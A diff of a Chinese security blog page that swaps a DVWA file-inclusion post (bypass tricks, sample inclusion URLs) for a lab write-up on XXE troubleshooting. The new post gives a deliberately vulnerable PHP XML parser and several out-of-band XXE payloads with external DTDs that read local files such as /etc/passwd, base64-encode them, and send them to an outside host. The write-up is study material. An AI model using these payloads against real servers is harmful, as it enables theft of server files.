@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Web安全,">
+  <meta name="keywords" content="m3lon">
 
 
 
@@ -79,18 +79,17 @@
 
 
 
-<meta name="description" content="File Inclusion分为本地文件包含和远程文件包含，远程文件包含是开启了php配置中的allow_url_fopen (选项开启后，服务器允许包含一个远程文件) 相关配置; Whether to allow the treatment of URLs (like http:// or ftp://) as files. allow_url_fopen = On ; Whether to a">
-<meta name="keywords" content="Web安全">
+<meta name="description" content="文章阅读： https://xz.aliyun.com/t/2249   苦行僧一般的修炼…   实验服务器ubuntu xml.php:1234567&amp;lt;?php    libxml_disable_entity_loader (false);    $xmlfile = file_get_contents(&apos;php://input&apos;);    $dom = new DOMDocument(">
 <meta property="og:type" content="article">
-<meta property="og:title" content="DVWA File Inclusion">
-<meta property="og:url" content="http://m3lon.github.io/2018/01/26/DVWA-File-Inclusion/index.html">
+<meta property="og:title" content="xxe实验踩坑记录">
+<meta property="og:url" content="http://m3lon.github.io/2019/01/20/xxe实验踩坑记录/index.html">
 <meta property="og:site_name" content="m3lon">
-<meta property="og:description" content="File Inclusion分为本地文件包含和远程文件包含，远程文件包含是开启了php配置中的allow_url_fopen (选项开启后，服务器允许包含一个远程文件) 相关配置; Whether to allow the treatment of URLs (like http:// or ftp://) as files. allow_url_fopen = On ; Whether to a">
+<meta property="og:description" content="文章阅读： https://xz.aliyun.com/t/2249   苦行僧一般的修炼…   实验服务器ubuntu xml.php:1234567&amp;lt;?php    libxml_disable_entity_loader (false);    $xmlfile = file_get_contents(&apos;php://input&apos;);    $dom = new DOMDocument(">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2018-01-31T07:35:43.259Z">
+<meta property="og:updated_time" content="2019-01-20T11:53:45.588Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="DVWA File Inclusion">
-<meta name="twitter:description" content="File Inclusion分为本地文件包含和远程文件包含，远程文件包含是开启了php配置中的allow_url_fopen (选项开启后，服务器允许包含一个远程文件) 相关配置; Whether to allow the treatment of URLs (like http:// or ftp://) as files. allow_url_fopen = On ; Whether to a">
+<meta name="twitter:title" content="xxe实验踩坑记录">
+<meta name="twitter:description" content="文章阅读： https://xz.aliyun.com/t/2249   苦行僧一般的修炼…   实验服务器ubuntu xml.php:1234567&amp;lt;?php    libxml_disable_entity_loader (false);    $xmlfile = file_get_contents(&apos;php://input&apos;);    $dom = new DOMDocument(">
 
 
 
@@ -120,13 +119,13 @@
 
 
 
-  <link rel="canonical" href="http://m3lon.github.io/2018/01/26/DVWA-File-Inclusion/">
+  <link rel="canonical" href="http://m3lon.github.io/2019/01/20/xxe实验踩坑记录/">
 
 
 
 
 
-  <title>DVWA File Inclusion | m3lon</title>
+  <title>xxe实验踩坑记录 | m3lon</title>
   
 
 
@@ -293,7 +292,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://m3lon.github.io/2018/01/26/DVWA-File-Inclusion/">
+    <link itemprop="mainEntityOfPage" href="http://m3lon.github.io/2019/01/20/xxe实验踩坑记录/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="m3lon">
@@ -310,7 +309,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">DVWA File Inclusion</h1>
+          <h1 class="post-title" itemprop="name headline">xxe实验踩坑记录</h1>
         
 
         <div class="post-meta">
@@ -322,8 +321,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-01-26T15:43:01+08:00">
-                2018-01-26
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-01-20T18:03:58+08:00">
+                2019-01-20
               </time>
             
 
@@ -387,37 +386,26 @@
       
 
       
-        <p>File Inclusion分为本地文件包含和远程文件包含，远程文件包含是开启了php配置中的allow_url_fopen (选项开启后，服务器允许包含一个远程文件)</p>
-<h3 id="相关配置"><a href="#相关配置" class="headerlink" title="相关配置"></a>相关配置</h3><p>; Whether to allow the treatment of URLs (like http:// or ftp://) as files.</p>
-<p>allow_url_fopen = On</p>
-<p>; Whether to allow include/require to open URLs (like http:// or ftp://) as files.</p>
-<p>allow_url_include = On</p>
-<p>; Magic quotes for incoming GET/POST/Cookie data.</p>
-<p>magic_quotes_gpc = On</p>
-<p>魔术引号（Magic Quote）是一个自动将进入 PHP 脚本的数据进行转义的过程。最好在编码时不要转义而在运行时根据需要而转义。</p>
-<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">Warning</span> 本特性已自 <span class="selector-tag">PHP</span> 5<span class="selector-class">.3</span><span class="selector-class">.0</span> 起废弃并将自 <span class="selector-tag">PHP</span> 5<span class="selector-class">.4</span><span class="selector-class">.0</span> 起移除。</span><br></pre></td></tr></table></figure>
-<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><ul>
-<li>服务器开启alow_url_include</li>
-<li>参数可控 eg：$file=$_GET[‘page’];</li>
-<li>使用php特性函数对于可控的参数进行处理：include(),require(),include_once(),require_once()</li>
-</ul>
-<h3 id="防御函数"><a href="#防御函数" class="headerlink" title="防御函数"></a>防御函数</h3><ul>
-<li>str_replace: 对 http://,../ 等进行替换（删除）</li>
-<li>fnmatch: 用模式匹配文件</li>
-<li>白名单机制防护，基本无法实现攻击</li>
-</ul>
-<h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul>
-<li>如果存在报错，测试:/etc/shadow等测试系统类型：Windows/Linux</li>
-<li>暴露绝对路径或者利用相对路径读取配置文件php.ini等</li>
-</ul>
-<h3 id="攻击技巧"><a href="#攻击技巧" class="headerlink" title="攻击技巧"></a>攻击技巧</h3><ul>
-<li>在php版本小于5.3.4的服务器中，当Magic_quote_gpc=Off时，可以在文件名中使用%00进行截断（%00后的内容不会被识别），因此可以使用%00绕过某些过滤规则，例如对文件后缀有特殊要求的时候……</li>
-<li>远程文件包含时的编码绕过</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.153.130/dvwa/vulnerabilities/fi/page=http://192.168.5.12/phpinfo.txt</span><br><span class="line">编码绕过：http://192.168.153.130/dvwa/vulnerabilities/fi/page=%68%74%74%70%3a%2f%2f%31%39%32%2e%31%36%38%2e%35%2e%31%32%2f%70%68%70%69%6e%66%6f%2e%74%78%74</span><br></pre></td></tr></table></figure>
+        <p>文章阅读： <a href="https://xz.aliyun.com/t/2249" target="_blank" rel="noopener">https://xz.aliyun.com/t/2249</a>  </p>
+<p>苦行僧一般的修炼…  </p>
+<h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><p>服务器ubuntu xml.php:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    libxml_disable_entity_loader (<span class="keyword">false</span>);</span><br><span class="line">    $xmlfile = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">    $dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">    $creds = simplexml_import_dom($dom);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>其中：<br>LIBXML_NOENT: 将 XML 中的实体引用 替换 成对应的值<br>LIBXML_DTDLOAD: 加载 DOCTYPE 中的 DTD 文件</p>
+<p>坑… 踩了一个又一个233333…<br><strong>我之前的某个疑惑 ：</strong><br>思考：为什么非要从服务器读取evil.dtd呢？直接在下面调用不可以吗？  </p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE roottag [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % start "&lt;![CDATA"&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % end "]]&gt;</span>"&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">all</span> "%<span class="attr">start</span>;%<span class="attr">file</span>;%<span class="attr">end</span>;"&gt;</span></span><br><span class="line">]&gt; </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">roottag</span>&gt;</span>&amp;all;<span class="tag">&lt;/<span class="name">roottag</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>报错：PEReferences(Parameter-entity) forbidden in internal subset in Entity<br>原因：In the internal subset of DTD, references to parameter entities are not allowed within markup declarations. You have to use an external DTD<a href="https://www.w3.org/TR/xml/#wfc-PEinInternalSubset" target="_blank" rel="noopener">规则</a> 也就是说在DTD内部子集中，参数实体的引用不允许在标记声明里。在外部DTD中，是可以的    </p>
+<p><strong>又…某个神奇的报错：</strong><br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">evil.dtd:</span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">file</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">var</span>/<span class="attr">www</span>/<span class="attr">test.txt</span>"&gt;</span></span><br><span class="line">&lt;!ENTITY % int "&lt;!ENTITY % send SYSTEM 'http://123.207.153.65?p=%file;'&gt;"&gt;</span><br></pre></td></tr></table></figure></p>
+<p>DOMDocument::loadXML(): Entity Value: ‘%’ forbidden except for entities<br>原因：报错已经说的很清楚了，%不允许出现在Entity的value中. 所以需要将%进行Unicode编码为<code>&amp;#37;</code>（在xml中Unicode编码与字符本身是一样的），</p>
+<p><strong>继续思考…继续踩…</strong><br>思考：为什么不可以直接定义呢？<br><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">evil.dtd:</span><br><span class="line">&lt;!<span class="keyword">ENTITY</span> % send SYSTEM <span class="symbol">'http</span>://<span class="number">123.207</span>.<span class="number">153.65</span>?p=%<span class="keyword">file</span>;'&gt;</span><br></pre></td></tr></table></figure></p>
+<p>报错：发现直接声明参数实体send然后引用%send; , 结果就是%file;没有被解析<br>原因：所以需要在外面包一个参数实体int的声明，<code>%int;</code>引用的时候%file;会被成功解析，然后在%send;就可以成功的将解析<code>%file;</code>的内容传出。所以<code>%int</code>只是辅助的作用，用于辅助解释send实体内容。</p>
+<p><strong>continue</strong><br>经过大概一天的时间，终于知道问题所在，感谢🙏师父，不然我真是要睡的不明不白了23333…<br>下面的payload<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE roottag [ </span></span><br><span class="line"><span class="meta">&lt;!ENTITY % dtd SYSTEM "http://x.x.x.x/evil.txt"&gt; </span></span><br><span class="line"><span class="meta">%dtd;%int;%send; </span></span><br><span class="line"><span class="meta">]&gt;</span> </span><br><span class="line"></span><br><span class="line">evil.txt</span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">file</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>//<span class="attr">etc</span>/<span class="attr">var</span>/<span class="attr">secret</span>"&gt;</span></span><br><span class="line">&lt;!ENTITY % int "&lt;!ENTITY &amp;#37; send SYSTEM "http://45.76.x.x/:9999?p=%file;"&gt;"&gt;</span><br></pre></td></tr></table></figure></p>
+<p>为什么会出现<code>loadXML(): Invalid URI: http://x.x.x.x:9999/?p=iitestjfkljal in Entity,</code>这种报错呢？<br>诚如报错信息本身，是无效的URL，我也考虑再三，可是怎么看都没有问题，没有：也没有加xml中的特殊字符，但是关于字符，有可见字符，也有不可见字符，所以这种情况，需要十六进制（xxd或者hexdump -C）显示一下是否有系统自己添加的特殊字符，就像<code>echo &quot;m3lon&quot; &gt; secret</code>echo命令本身就是回车显示，所以看似没有问题的URL，其实有一个小小的回车(0a)存在。<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@VM-12-40-ubuntu:~$ hexdump -C /var/www/secret</span><br><span class="line">00000000  6d 33 6c 6f 6e 0a        |m3lon.|</span><br><span class="line">00000006</span><br></pre></td></tr></table></figure></p>
+<p>所以最优的方法就是改为下面利用php://filter流<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">evil.txt</span><br><span class="line">&lt;<span class="title">!ENTITY</span> % file SYSTEM <span class="string">"php://filter/read=convert.base64-encode/resource=file://etc/var/secret"</span>&gt;</span><br><span class="line">&lt;<span class="title">!ENTITY</span> % int <span class="string">"&lt;!ENTITY &amp;#37; send SYSTEM "</span>http://<span class="number">45.76</span>.<span class="keyword">x</span>.<span class="keyword">x</span>/:<span class="number">9999</span>?p=<span class="symbol">%file</span><span class="comment">;"&gt;"&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>ps：网络上的payload稂莠不齐，经过我这番踩坑，对于以后的各种报错，大致知道是什么问题了  </p>
+<p>终极payload奉上：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE roottag [ </span></span><br><span class="line"><span class="meta">&lt;!ENTITY % dtd SYSTEM "http://x.x.x.x/evil.txt"&gt; </span></span><br><span class="line"><span class="meta">%dtd;%int;%send; ]&gt;</span> </span><br><span class="line"></span><br><span class="line">evil.txt</span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">file</span> <span class="attr">SYSTEM</span> "<span class="attr">php:</span>//<span class="attr">filter</span>/<span class="attr">read</span>=<span class="string">convert.base64-encode/resource</span>=<span class="string">file:///var/www/secret</span>"&gt;</span></span><br><span class="line">&lt;!ENTITY % int "&lt;!ENTITY &amp;#x25; send SYSTEM 'http://x.x.x.x:9999/?p=%file;'&gt;"&gt;</span><br></pre></td></tr></table></figure></p>
+<p>参考：  </p>
 <ul>
-<li>针对str_replace的双写绕过，上面的url编码无法绕过str_replace，因为解码是在浏览器端执行的。</li>
-<li>针对fnmatch的绕过，借用文件上传漏洞，再利用file协议去包含上传文件（需要知道上传文件的绝对路径），从而实现任意命令执行。</li>
+<li><a href="https://findneo.github.io/180811-xxe-injection/" target="_blank" rel="noopener">https://findneo.github.io/180811-xxe-injection/</a></li>
+<li><a href="https://gist.github.com/staaldraad/01415b990939494879b4" target="_blank" rel="noopener">https://gist.github.com/staaldraad/01415b990939494879b4</a></li>
 </ul>
 
       
@@ -458,12 +446,6 @@
 
     <footer class="post-footer">
       
-        <div class="post-tags">
-          
-            <a href="/tags/Web安全/" rel="tag"># Web安全</a>
-          
-        </div>
-      
 
       
       
@@ -473,15 +455,15 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
+              <a href="/2019/01/20/重装系统后hexo的部署/" rel="next" title="重装系统后hexo的部署">
+                <i class="fa fa-chevron-left"></i> 重装系统后hexo的部署
+              </a>
+            
           </div>
 
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/01/31/常用危险函数/" rel="prev" title="常用危险函数">
-                常用危险函数 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -636,7 +618,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#相关配置"><span class="nav-number">1.</span> <span class="nav-text">相关配置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞成因"><span class="nav-number">2.</span> <span class="nav-text">漏洞成因</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#防御函数"><span class="nav-number">3.</span> <span class="nav-text">防御函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#攻击思路"><span class="nav-number">4.</span> <span class="nav-text">攻击思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#攻击技巧"><span class="nav-number">5.</span> <span class="nav-text">攻击技巧</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#实验"><span class="nav-number">1.</span> <span class="nav-text">实验</span></a></li></ol></div>
             
 
           </div>
